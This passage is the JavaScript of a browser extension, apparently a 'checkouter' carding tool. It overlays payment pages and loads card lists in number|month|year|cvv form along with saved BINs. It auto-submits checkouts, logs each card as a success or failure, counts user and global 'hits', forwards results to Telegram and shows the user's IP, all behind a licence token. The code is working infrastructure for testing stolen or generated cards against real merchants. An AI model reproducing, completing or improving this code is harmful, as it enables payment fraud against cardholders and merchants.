          type: "SAVE_LOGIN_STATE",
          token: token,
          userId: userId,
          firstName: userFirstName,
        }, "*")

        const loginScreen = document.getElementById("loginScreen")
        const dashboard = document.getElementById("mainDashboard")
        loginScreen?.classList.add("hidden")
        dashboard?.classList.remove("hidden")
        dashboard?.classList.add("dashboard-enter")

        const welcomeMsg = result.firstName ? `Welcome, ${result.firstName}!` : "Login successful!"
        showWarning(welcomeMsg, "success")
      } else {
        showLoginError(result.message || "Invalid token")
      }
    } catch (error) {
      showLoginError("Connection error")
    }
    loginBtn.disabled = false
    loginBtn.innerHTML = LX.key + " LOGIN"
  }

  async function validateToken(token) {
    if (!token || token.length !== 15) {
      return { success: false, message: "Token must be 15 characters" }
    }
    const data = await sendToBackground({ type: "VALIDATE_TOKEN", token: token })
    if (data.success) {
      return {
        success: true,
        userId: String(data.user_id),
        username: data.username,
        firstName: data.first_name,
        pfpUrl: data.pfp_url || '',
        hits: data.hits,
        attempts: data.attempts,
        globalHits: data.global_hits,
        userHits: data.user_hits,
      }
    } else {
      return { success: false, message: data.error || "Invalid token" }
    }
  }

  async function validateSavedToken(token) {
    if (!token || token.length !== 15) {
      return false
    }
    try {
      const data = await sendToBackground({ type: "VALIDATE_TOKEN", token: token })
      return data.success === true
    } catch (e) {
      return true
    }
  }

  function showLoginError(message) {
    const loginError = document.getElementById("loginError")
    if (loginError) {
      loginError.textContent = message
      loginError.classList.remove("hidden")
      setTimeout(() => {
        loginError.classList.add("hidden")
      }, 3000)
    }
  }

  function handleLogout() {
    stopHitCountsRefresh();
    userId = ""
    userFirstName = ""
    userPfpUrl = DEFAULT_PFP
    userHitsCount = 0
    userAttemptsCount = 0
    globalHitsCount = 0
    isLoggedIn = false
    // Clear ALL user-related localStorage keys
    localStorage.removeItem(K.TOKEN)
    localStorage.removeItem(K.USER_ID)
    localStorage.removeItem(K.FIRST_NAME)
    // Clear chrome.storage session
    if (window.LynixStorage && window.LynixStorage.clearUserSession) {
      window.LynixStorage.clearUserSession();
    }
    window.postMessage({ type: "SAVE_LOGIN_STATE", token: null }, "*")
    updateIpBarUserInfo()
    document.getElementById("loginScreen")?.classList.remove("hidden")
    document.getElementById("mainDashboard")?.classList.add("hidden")
    const tokenInput = document.getElementById("tokenInput")
    if (tokenInput) tokenInput.value = ""
    showWarning("Logged out", "info")
  }

  // ============= CROSS-TAB STORAGE SYNC LISTENER =============
  // This MUST be inside the IIFE so it has access to all variables and functions
  window.addEventListener('message', async (event) => {
    if (event.data && event.data.type === 'LYNIX_STORAGE_CHANGED') {
      const changes = event.data.changes || {};

      // Sync login/logout state (null = key was removed = logout)
      if (K.TOKEN in changes) {
        if (changes[K.TOKEN] && changes[K.TOKEN] !== null) {
          // New token from another tab -- validate before applying
          const isValid = await validateSavedToken(changes[K.TOKEN]);
          if (isValid) {
            const token = changes[K.TOKEN];
            localStorage.setItem(K.TOKEN, token);
            if (changes[K.USER_ID]) {
              userId = changes[K.USER_ID];
              localStorage.setItem(K.USER_ID, userId);
              savedId = userId;
            }
            if (changes[K.FIRST_NAME]) {
              userFirstName = changes[K.FIRST_NAME];
              localStorage.setItem(K.FIRST_NAME, userFirstName);
            }
            isLoggedIn = true;

            // Fetch fresh user data (pfp, hits) for this tab
            try {
              const result = await validateToken(token);
              if (result.success) {
                userPfpUrl = result.pfpUrl || DEFAULT_PFP;
                userHitsCount = result.userHits ?? result.hits ?? 0;
                globalHitsCount = result.globalHits ?? globalHitsCount;
                userAttemptsCount = result.attempts || 0;
              }
            } catch (e) { }

            await Promise.race([fetchHitCounts(), new Promise(r => setTimeout(r, 2000))]);

            // Show dashboard, hide login screen
            const loginScreen = document.getElementById('loginScreen');
            const dashboard = document.getElementById('mainDashboard');
            if (loginScreen && dashboard && !loginScreen.classList.contains('hidden')) {
              loginScreen.classList.add('hidden');
              dashboard.classList.remove('hidden');
              showWarning('Logged in from another tab', 'success');
            }
            updateIpBarUserInfo();
            startHitCountsRefresh();
          }
        } else {
          // Logged out from another tab
          stopHitCountsRefresh();
          isLoggedIn = false;
          userId = '';
          userFirstName = '';
          userPfpUrl = DEFAULT_PFP;
          userHitsCount = 0;
          userAttemptsCount = 0;
          globalHitsCount = 0;
          localStorage.removeItem(K.TOKEN);
          localStorage.removeItem(K.USER_ID);
          localStorage.removeItem(K.FIRST_NAME);
          updateIpBarUserInfo();

          // Show login screen
          const loginScreen = document.getElementById('loginScreen');
          const dashboard = document.getElementById('mainDashboard');
          if (loginScreen && dashboard) {
            loginScreen.classList.remove('hidden');
            dashboard.classList.add('hidden');
          }
          const tokenInput = document.getElementById('tokenInput');
          if (tokenInput) tokenInput.value = '';
          showWarning('Logged out from another tab', 'info');
        }
      }

      // Sync BINs
      if (changes[K.SAVED_BINS] !== undefined && Array.isArray(changes[K.SAVED_BINS])) {
        savedBINs = changes[K.SAVED_BINS];
        currentBinIndex = 0;
        localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
        rebuildBinListUI();
      }

      // Sync custom name/email
      if (changes[K.CUSTOM_NAME] !== undefined) {
        customName = changes[K.CUSTOM_NAME];
        localStorage.setItem(K.CUSTOM_NAME, customName);
        const nameInput = document.getElementById('customNameInput');
        if (nameInput) nameInput.value = customName;
      }
      if (changes[K.CUSTOM_EMAIL] !== undefined) {
        customEmail = changes[K.CUSTOM_EMAIL];
        localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
        const emailInput = document.getElementById('customEmailInput');
        if (emailInput) emailInput.value = customEmail;
      }

      // Sync toggle states
      if (changes[K.TOGGLE_TG_FORWARD] !== undefined) {
        tgForwardEnabled = changes[K.TOGGLE_TG_FORWARD] !== false;
        localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
      }
      if (changes[K.TOGGLE_HIT_SOUND] !== undefined) {
        localStorage.setItem(K.TOGGLE_HIT_SOUND, changes[K.TOGGLE_HIT_SOUND]);
      }
      if (changes[K.TOGGLE_AUTO_SS] !== undefined) {
        localStorage.setItem(K.TOGGLE_AUTO_SS, changes[K.TOGGLE_AUTO_SS]);
      }

      // Sync saved ID
      if (changes[K.SAVED_ID] !== undefined) {
        savedId = changes[K.SAVED_ID];
        localStorage.setItem(K.SAVED_ID, savedId);
      }

      // Sync background/color settings
      if (changes[K.BG_COLOR] !== undefined) {
        pageBackgroundColor = changes[K.BG_COLOR];
        localStorage.setItem(K.BG_COLOR, changes[K.BG_COLOR]);
      }
      if (changes[K.HAS_CUSTOM_COLOR] !== undefined) {
        localStorage.setItem(K.HAS_CUSTOM_COLOR, changes[K.HAS_CUSTOM_COLOR]);
      }
      if (changes[K.BG_ENABLED] !== undefined) {
        localStorage.setItem(K.BG_ENABLED, changes[K.BG_ENABLED]);
      }
      if (changes[K.PAGE_BG_COLOR] !== undefined) {
        localStorage.setItem(K.PAGE_BG_COLOR, changes[K.PAGE_BG_COLOR]);
      }
      if (changes[K.PAGE_HAS_CUSTOM] !== undefined) {
        userHasSetCustomColor = changes[K.PAGE_HAS_CUSTOM] === true || changes[K.PAGE_HAS_CUSTOM] === 'true';
      }

      // Sync logs
      if (changes[K.LOGS] !== undefined) {
        let logs = changes[K.LOGS];
        if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
        if (Array.isArray(logs)) {
          cardHistory = logs;
          localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
      }
      if (changes[K.LOGS_CLEARED_AT] !== undefined) {
        localStorage.setItem(K.LOGS_CLEARED_AT, changes[K.LOGS_CLEARED_AT]);
      }

      // Sync music (name only -- MUSIC_DATA stays in chrome.storage, too large for localStorage)
      if (changes[K.MUSIC_NAME] !== undefined) {
        localStorage.setItem(K.MUSIC_NAME, changes[K.MUSIC_NAME]);
      }

      // Sync card history
      if (changes[K.CARD_HISTORY] !== undefined) {
        let hist = changes[K.CARD_HISTORY];
        if (typeof hist === 'string') try { hist = JSON.parse(hist); } catch (e) { hist = []; }
        if (Array.isArray(hist)) localStorage.setItem(K.CARD_HISTORY, JSON.stringify(hist));
      }

      // Sync last seen BIN time
      if (changes[K.LAST_SEEN_BIN_TIME] !== undefined) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, changes[K.LAST_SEEN_BIN_TIME]);
      }
    }
  });

  // ============= REBUILD BIN LIST UI AFTER CROSS-TAB SYNC =============
  function rebuildBinListUI() {
    const binListContainer = document.getElementById('binListContainer');
    if (!binListContainer) return;

    // Clear existing entries
    binListContainer.innerHTML = '';

    savedBINs.forEach((bin, i) => {
      const row = document.createElement('div');
      row.className = 'bin-row';
      row.style.cssText = 'display:flex;gap:6px;margin-bottom:4px;align-items:center;';

      const input = document.createElement('input');
      input.type = 'text';
      input.className = 'bin-input';
      input.value = bin;
      input.maxLength = 8;
      input.placeholder = 'Enter BIN';
      input.dataset.index = i;
      input.addEventListener('input', () => {
        savedBINs[i] = input.value.replace(/\D/g, '');
      });

      if (i === 0) {
        const addBtn = document.createElement('button');
        addBtn.className = 'bin-add-btn';
        addBtn.textContent = '+';
        addBtn.addEventListener('click', () => {
          savedBINs.push('');
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(addBtn);
      } else {
        const removeBtn = document.createElement('button');
        removeBtn.className = 'bin-remove-btn';
        removeBtn.textContent = '-';
        removeBtn.addEventListener('click', () => {
          savedBINs.splice(i, 1);
          saveBINs(savedBINs);
          rebuildBinListUI();
        });
        row.appendChild(input);
        row.appendChild(removeBtn);
      }

      binListContainer.appendChild(row);
    });

    // Ensure at least one empty row
    if (savedBINs.length === 0) {
      savedBINs.push('');
      rebuildBinListUI();
    }
  }

  window.addEventListener("message", (event) => {
    if (event.data && event.data.type === "EXTENSION_INVALIDATED") {
      setTimeout(() => {
        window.postMessage({ type: "GET_LOGIN_STATE" }, "*")
      }, 2000)
    }
  })
  let musicPlayer = null
  function toggleMusic() {
    const musicBtn = document.getElementById("musicToggleBtn")
    if (isMusicPlaying) {
      stopMusic()
      if (musicBtn) musicBtn.innerHTML = LX.music
      isMusicPlaying = false
    } else {
      const success = playMusicMp3()
      if (success) {
        if (musicBtn) musicBtn.innerHTML = LX.musicPlay
        isMusicPlaying = true
      }
    }
  }
  function stopMusic() {
    window.postMessage({ type: "STOP_BACKGROUND_MUSIC" }, "*")
    if (musicPlayer) {
      try {
        musicPlayer.pause()
        musicPlayer.currentTime = 0
        if (musicPlayer.parentNode) {
          musicPlayer.parentNode.removeChild(musicPlayer)
        }
      } catch (e) { }
      musicPlayer = null
    }
    const audioPlayer = document.getElementById("MRCheckouterAudioPlayer")
    if (audioPlayer) {
      try {
        audioPlayer.pause()
        audioPlayer.remove()
      } catch (e) { }
    }
    isMusicPlaying = false
  }
  function playMusicMp3() {
    stopMusic()

    const hasCustomMusic = localStorage.getItem(K.MUSIC_NAME)
    if (hasCustomMusic) {
      window.postMessage({ type: "PLAY_BACKGROUND_MUSIC", volume: soundVolume }, "*")
      isMusicPlaying = true
      const musicBtn = document.getElementById("musicToggleBtn")
      if (musicBtn) musicBtn.innerHTML = LX.musicPlay
      showWarning("Custom music playing", "success")
      return true
    }

    window.postMessage({ type: "GET_MUSIC_URL" }, "*")
    return true
  }
  window.addEventListener("message", (event) => {
    if (event.source !== window) return
    if (event.data.type === "MUSIC_URL") {
      const musicUrl = event.data.url
      try {
        musicPlayer = new Audio(musicUrl)
        musicPlayer.loop = true
        musicPlayer.volume = soundVolume
        musicPlayer.onloadeddata = () => {
          musicPlayer
            .play()
            .then(() => {
              isMusicPlaying = true
              const musicBtn = document.getElementById("musicToggleBtn")
              if (musicBtn) musicBtn.innerHTML = LX.musicPlay
              showWarning("Music playing", "success")
            })
            .catch((err) => {
              showWarning("Tap music btn again", "info")
            })
        }
        musicPlayer.onerror = (e) => {
          showWarning("Music not available", "error")
        }
      } catch (e) {
        showWarning("Cannot play music", "error")
      }
    }
  })
  function setMode(mode) {
    currentMode = mode
    document.querySelectorAll(".mode-btn").forEach((btn) => {
      btn.classList.toggle("active", btn.dataset.mode === mode)
    })
    const binSection = document.getElementById("binSection")
    const ccSection = document.getElementById("ccSection")
    if (mode === "bin") {
      binSection?.classList.remove("hidden")
      ccSection?.classList.add("hidden")
    } else {
      binSection?.classList.add("hidden")
      ccSection?.classList.remove("hidden")
    }
  }
  function updateCcCount() {
    const ccTextarea = document.getElementById("ccTextarea")
    const ccCount = document.getElementById("ccCount")
    if (!ccTextarea || !ccCount) return
    const lines = ccTextarea.value.split("\n").filter((line) => line.trim() && line.includes("|"))
    ccCount.textContent = Math.min(lines.length, 20)
  }
  function saveCcListFunc() {
    const ccTextarea = document.getElementById("ccTextarea")
    if (!ccTextarea) return
    const lines = ccTextarea.value
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => {
        const parts = line.split("|")
        return parts.length === 4 && parts[0].length >= 13
      })
      .slice(0, 20)
    ccList = lines
    currentCCIndex = 0
    const ccInfo = document.querySelector(".cc-info")
    if (ccInfo) ccInfo.textContent = `${ccList.length} cards loaded`
    const modal = document.getElementById("ccModal")
    modal.classList.remove("show")
    setTimeout(() => modal.classList.add("hidden"), 400)
    showWarning(`${ccList.length} cards saved`, "success")
  }
  function getNextCC() {
    if (ccList.length === 0 || currentCCIndex >= ccList.length) {
      return null
    }
    const cc = ccList[currentCCIndex]
    currentCCIndex++
    const parts = cc.split("|")
    return {
      number: parts[0],
      month: parts[1],
      year: parts[2],
      cvv: parts[3],
    }
  }
  function toggleCollapsible(contentId, header) {
    const content = document.getElementById(contentId)
    const icon = header.querySelector(".collapse-icon")
    if (content.classList.contains("open")) {
      content.classList.remove("open")
      icon.innerHTML = LX.chevDown
    } else {
      content.classList.add("open")
      icon.innerHTML = LX.chevUp
    }
  }
  function addToHistory(card, mm, yy, cvv, response) {
    const entry = {
      card: `${card}|${mm}|${yy}|${cvv}`,
      response: response,
      time: new Date().toLocaleTimeString(),
    }
    cardHistory.unshift(entry)
    if (cardHistory.length > 50) cardHistory.pop()
    saveCardHistory()
    updateHistoryDisplay()
    updateStats()
  }
  function updateHistoryDisplay() {
    const historyList = document.getElementById("historyList")
    if (!historyList) return
    if (cardHistory.length === 0) {
      historyList.innerHTML = '<div class="history-empty">No logs yet</div>'
      return
    }
    const logsToShow = cardHistory.slice(0, 50)
    historyList.innerHTML = logsToShow
      .map(
        (entry, index) => `
    <div class="history-item ${entry.response === "SUCCESS" ? "success" : "error"}">
      <div class="history-main">
        <div class="history-card-line">
          <span class="history-card">${entry.card}</span>
          button class="history-copy" data-card="${entry.card}" data-index="${index}">${LX.copy}</button>
        </div>
        <div class="history-response">${entry.response}</div>
      </div>
    </div>
  `,
      )
      .join("")
    historyList.querySelectorAll(".history-copy").forEach((btn) => {
      btn.addEventListener("click", function () {
        const card = this.getAttribute("data-card")
        if (card) {
          navigator.clipboard
            .writeText(card)
            .then(() => {
              this.innerHTML = LX.check
              setTimeout(() => {
                this.innerHTML = LX.copy
              }, 1000)
            })
            .catch(() => {
              window.postMessage({ type: "COPY_TO_CLIPBOARD_TEXT", text: card }, "*")
              this.innerHTML = LX.check
              setTimeout(() => {
                this.innerHTML = LX.copy
              }, 1000)
            })
        }
      })
    })
  }
  function updateStats(serverAttempts, serverHits) {
    const attemptsEl = document.getElementById("statAttempts")
    const successEl = document.getElementById("statSuccess")
    const attempts = serverAttempts !== undefined ? serverAttempts : attemptCount
    const hits = serverHits !== undefined ? serverHits : cardHistory.filter((h) => h.response === "SUCCESS").length
    if (attemptsEl) attemptsEl.textContent = attempts
    if (successEl) successEl.textContent = hits
  }
  window.addEventListener("message", (event) => {
    if (event.source !== window) return
    switch (event.data.type) {
      case "UPDATE_SAVED_BIN":
        if (event.data.bin) {
          if (savedBINs.length === 0) {
            savedBINs = [event.data.bin]
          }
          const binInput = document.getElementById("binInput1")
          if (binInput && !binInput.value) {
            binInput.value = event.data.bin
          }
          updateBinStatus()
        }
        break
      case "UPDATE_SAVED_ID":
        if (event.data.id) {
          savedId = event.data.id
          updateIdStatus()
        }
        break
      case "UPDATE_TOGGLE_STATES":
        break
      case "UPDATE_LOGIN_STATE":
        if (event.data.userId && !isLoggedIn) {
          userId = event.data.userId || ""
          userFirstName = event.data.firstName || ""
          isLoggedIn = true
          if (userId) localStorage.setItem(K.USER_ID, userId)
          if (userFirstName) localStorage.setItem(K.FIRST_NAME, userFirstName)
          const loginScreen = document.getElementById("loginScreen")
          const dashboard = document.getElementById("mainDashboard")
          if (loginScreen) loginScreen.classList.add("hidden")
          if (dashboard) dashboard.classList.remove("hidden")
          updateIpBarUserInfo()
          startHitCountsRefresh()
        }
    }
  })
  function createPageWatermark() {
    if (document.getElementById("lynix-page-watermark")) return
    const watermark = document.createElement("div")
    watermark.id = "lynix-page-watermark"
    watermark.className = "lynix-page-watermark"
    watermark.innerHTML = `
    <div class="lynix-wm-line"></div>
    <span>U</span>
    <span>S</span>
    <span>A</span>
    <span>G</span>
    <span>I</span>
    <div class="lynix-wm-line"></div>
  `
    document.body.appendChild(watermark)
  }

  function drawPfpOnCanvas(url, canvas, fallback) {
    if (!url || url === DEFAULT_PFP) {
      canvas.style.display = "none";
      fallback.style.display = "flex";
      return;
    }
    sendToBackground({ type: "FETCH_IMAGE", url: url }).then(result => {
      if (!result || !result.success || !result.dataUrl) {
        canvas.style.display = "none";
        fallback.style.display = "flex";
        return;
      }
      const byteString = atob(result.dataUrl.split(',')[1]);
      const mimeType = result.dataUrl.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      const blob = new Blob([ab], { type: mimeType });
      createImageBitmap(blob).then(bitmap => {
        const ctx = canvas.getContext("2d");
        const size = canvas.width;
        ctx.clearRect(0, 0, size, size);
        ctx.beginPath();
        ctx.arc(size / 2, size / 2, size / 2, 0, Math.PI * 2);
        ctx.closePath();
        ctx.clip();
        ctx.drawImage(bitmap, 0, 0, size, size);
        canvas.style.display = "block";
        fallback.style.display = "none";
      }).catch(() => {
        canvas.style.display = "none";
        fallback.style.display = "flex";
      });
    }).catch(() => {
      canvas.style.display = "none";
      fallback.style.display = "flex";
    });
  }

  let currentDisplayIp = "";
  let isIpBlurred = true;
  let ipRevealTimeout = null;

  function createBottomIpBar() {
    if (document.getElementById("lynix-bottom-ip-bar")) return;

    const showUser = isLoggedIn && userFirstName;
    const pfp = userPfpUrl || DEFAULT_PFP;
    const name = userFirstName || "User";
    const initials = name.slice(0, 2).toUpperCase();

    const ipBar = document.createElement("div");
    ipBar.id = "lynix-bottom-ip-bar";
    ipBar.className = "lynix-bottom-ip-bar";
    if (!isLoggedIn) ipBar.style.display = "none";

    // User section
    const userSection = document.createElement("div");
    userSection.className = "ipbar-user-section";
    userSection.id = "ipBarUserSection";
    if (!showUser) userSection.style.display = "none";

    const pfpWrap = document.createElement("div");
    pfpWrap.className = "ipbar-pfp-wrap";

    const pfpCanvas = document.createElement("canvas");
    pfpCanvas.id = "ipBarPfpCanvas";
    pfpCanvas.width = 72;
    pfpCanvas.height = 72;
    pfpCanvas.className = "ipbar-pfp-canvas";

    const pfpFallback = document.createElement("div");
    pfpFallback.className = "ipbar-pfp-fallback";
    pfpFallback.id = "ipBarPfpFallback";
    pfpFallback.textContent = initials;

    pfpWrap.appendChild(pfpCanvas);
    pfpWrap.appendChild(pfpFallback);

    if (showUser && pfp && pfp !== DEFAULT_PFP) {
      drawPfpOnCanvas(pfp, pfpCanvas, pfpFallback);
    } else {
      pfpCanvas.style.display = "none";
    }

    const userMeta = document.createElement("div");
    userMeta.className = "ipbar-user-meta";

    const usernameSpan = document.createElement("span");
    usernameSpan.className = "ipbar-username";
    usernameSpan.id = "ipBarUsername";
    usernameSpan.textContent = name;

    const statsSpan = document.createElement("span");
    statsSpan.className = "ipbar-stats";

    const globalLabel = document.createElement("span");
    globalLabel.className = "ipbar-stat-label";
    globalLabel.textContent = "GLOBAL:";
    const globalVal = document.createElement("span");
    globalVal.className = "ipbar-stat-val";
    globalVal.id = "ipBarGlobalHits";
    globalVal.textContent = globalHitsCount;
    const sep = document.createElement("span");
    sep.className = "ipbar-stat-sep";
    sep.textContent = "|";
    const hitLabel = document.createElement("span");
    hitLabel.className = "ipbar-stat-label";
    hitLabel.textContent = "HIT:";
    const hitVal = document.createElement("span");
    hitVal.className = "ipbar-stat-val";
    hitVal.id = "ipBarHits";
    hitVal.textContent = userHitsCount;

    statsSpan.appendChild(hitLabel);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(hitVal);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(sep);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(globalLabel);
    statsSpan.appendChild(document.createTextNode(" "));
    statsSpan.appendChild(globalVal);

    userMeta.appendChild(usernameSpan);
    userMeta.appendChild(statsSpan);

    userSection.appendChild(pfpWrap);
    userSection.appendChild(userMeta);

    // Divider
    const divider = document.createElement("div");
    divider.className = "ipbar-divider";
    divider.id = "ipBarDivider";
    if (!showUser) divider.style.display = "none";

    // IP section
    const ipSection = document.createElement("div");
    ipSection.className = "ipbar-ip-section ip-row-clickable";
    ipSection.id = "ipBarIpRow";

    const dot = document.createElement("span");
    dot.className = "ipbar-status-dot status-inactive";
    dot.id = "ipBarStatusDot";

    const ipLabel = document.createElement("span");
    ipLabel.className = "ipbar-ip-label";
    ipLabel.textContent = "IP:";

    const ipValue = document.createElement("span");
    ipValue.className = "ipbar-ip-value ip-blurred";
    ipValue.id = "ipBarIpValue";
    ipValue.textContent = "Loading...";

    ipSection.appendChild(dot);
    ipSection.appendChild(ipLabel);
    ipSection.appendChild(ipValue);

    ipBar.appendChild(userSection);
    ipBar.appendChild(divider);
    ipBar.appendChild(ipSection);

    document.body.appendChild(ipBar);

    ipSection.addEventListener("click", toggleIpReveal);
  }

  function updateIpBarUserInfo() {
    const ipBarEl = document.getElementById("lynix-bottom-ip-bar");
    const userSection = document.getElementById("ipBarUserSection");
    const divider = document.getElementById("ipBarDivider");
    const pfpCanvas = document.getElementById("ipBarPfpCanvas");
    const pfpFallback = document.getElementById("ipBarPfpFallback");
    const nameEl = document.getElementById("ipBarUsername");
    const hitsEl = document.getElementById("ipBarHits");
    const globalHitsEl = document.getElementById("ipBarGlobalHits");

    if (!isLoggedIn) {
      if (ipBarEl) ipBarEl.style.display = "none";
      return;
    }

    if (ipBarEl) ipBarEl.style.display = "flex";
    if (userSection) userSection.style.display = "flex";
    if (divider) divider.style.display = "block";

    const pfp = userPfpUrl || DEFAULT_PFP;
    const name = userFirstName || "User";
    const initials = name.slice(0, 2).toUpperCase();

    if (pfpFallback) pfpFallback.textContent = initials;
    if (pfpCanvas && pfp && pfp !== DEFAULT_PFP) {
      pfpCanvas.style.display = "";
      drawPfpOnCanvas(pfp, pfpCanvas, pfpFallback);
    } else if (pfpCanvas) {
      pfpCanvas.style.display = "none";
      if (pfpFallback) pfpFallback.style.display = "flex";
    }
    if (nameEl) nameEl.textContent = name;
    if (hitsEl) hitsEl.textContent = userHitsCount;
    if (globalHitsEl) globalHitsEl.textContent = globalHitsCount;
  }

  function toggleIpReveal() {
    const ipValue = document.getElementById("ipBarIpValue");
    if (!ipValue) return;

    if (ipRevealTimeout) {
      clearTimeout(ipRevealTimeout);
      ipRevealTimeout = null;
    }

    if (isIpBlurred) {
      ipValue.classList.remove("ip-blurred");
      ipValue.classList.add("ip-revealed");
      isIpBlurred = false;

      ipRevealTimeout = setTimeout(() => {
        ipValue.classList.remove("ip-revealed");
        ipValue.classList.add("ip-blurred");
        isIpBlurred = true;
      }, 5000);
    } else {
      ipValue.classList.remove("ip-revealed");
      ipValue.classList.add("ip-blurred");
      isIpBlurred = true;
    }
  }

  async function fetchRealIp() {
    try {
      const response = await sendToBackground({ type: "FETCH_REAL_IP" });
      if (response && response.ip) {
        currentDisplayIp = response.ip;
        updateBottomIpBar(response.ip);
      }
    } catch (e) {
    }
  }

  function updateBottomIpBar(ip) {
    const statusDot = document.getElementById("ipBarStatusDot");
    const ipValue = document.getElementById("ipBarIpValue");

    if (statusDot) {
      statusDot.className = ip
        ? "ipbar-status-dot status-active"
        : "ipbar-status-dot status-inactive";
    }

    if (ipValue && ip) {
      currentDisplayIp = ip;
      ipValue.textContent = ip;
      ipValue.className = isIpBlurred ? "ipbar-ip-value ip-blurred" : "ipbar-ip-value ip-revealed";
    }

    updateIpBarUserInfo();
  }

  ; (function initOnce() {
    if (window.__LynixCheckouterOverlayInit) return
    window.__LynixCheckouterOverlayInit = true
    if (window !== window.top) return
    function tryCreateOverlay() {
      if (document.body) {
        waitForPaymentPage(async (isPayment) => {
          if (isPayment) {
            isDashboardActive = true
            await createOverlay()
            // Watermark and IP bar removed in redesign

            autoExtractPaymentFromUrl()
            applyCustomStyles()
            initDarkAndPrivacy()

            if (licenseValid && !isVersionOutdated) {

              fetchBinLibrary().then(async () => {

                await checkNewBinNotification();

                if (extractedPaymentData.businessUrl) {
                  checkBinRecommendation(extractedPaymentData.businessUrl);
                }
              });

              // Auto-checkout if setting enabled
              chrome.storage.local.get('lynix_auto_checkout', (d) => {
                if (d.lynix_auto_checkout && !isAutoSubmitting && !hasHit) {
                  setTimeout(() => {
                    startAutoSubmit()
                    if (window._lxUpdateCtrl) window._lxUpdateCtrl(true)
                  }, 800)
                }
              })
            }
          }
        }, 10)
      } else {
        setTimeout(tryCreateOverlay, 50)
      }
    }
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", tryCreateOverlay, { once: true })
    } else {
      tryCreateOverlay()
    }

    // Safety net: retry overlay creation if page elements load late (VPN/proxy/slow connections)
    let retryCount = 0;
    const retryInterval = setInterval(() => {
      retryCount++;
      if (retryCount > 5 || isDashboardActive || isCreatingOverlay) {
        clearInterval(retryInterval);
        return;
      }
      if (document.body && !isDashboardActive && !isCreatingOverlay) {
        tryCreateOverlay();
      }
    }, 3000);
  })()
}
